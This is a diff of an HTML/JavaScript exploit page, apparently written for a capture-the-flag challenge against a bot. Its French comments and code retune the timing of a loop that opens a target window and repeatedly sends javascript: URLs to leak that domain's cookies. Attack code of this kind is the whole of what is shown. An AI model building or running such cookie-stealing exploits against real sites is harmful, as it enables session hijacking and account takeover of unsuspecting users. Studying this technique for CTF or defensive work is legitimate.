@@ -74,18 +74,20 @@ function attemptLeak() {
 }
 
 // TIMING CRITIQUE: 
-// 1. S'ouvrir (about:blank)
-// 2. Naviguer vers http://10-fast-fishers-app:5000/
-// 3. Charger les cookies du domaine
+// Problem: window.open() ouvre about:blank PUIS navigue asynchronously
+// Si on envoie javascript: URL trop tôt, ça interrompt la navigation!
+// 
+// Solution: ATTENDRE que T2 ait complètement chargé (2-3 secondes)
+// avant d'envoyer les javascript: URLs
 // 
 // Bot timeout = 5 secondes total
-// Strategy: commencer tôt (1.5s) mais espacer les tentatives (900ms)
-// pour que T2 ait le temps de charger entre chaque essai
+// Strategy: attendre 3.2s que T2 charge complètement
+// puis faire les tentatives rapidement
 setTimeout(() => {
   console.log("STARTING-LEAK-LOOP");
   attemptLeak();
-  const iv = setInterval(attemptLeak, 900); // 900ms entre chaque tentative
-}, 1500); // Start après 1.5s (laisse time à T2 de s'ouvrir)
+  const iv = setInterval(attemptLeak, 500); // Tentatives rapides après le chargement
+}, 3200); // Attendre 3.2 secondes pour que T2 se charge COMPLÈTEMENT
 
 </script>
 </body>
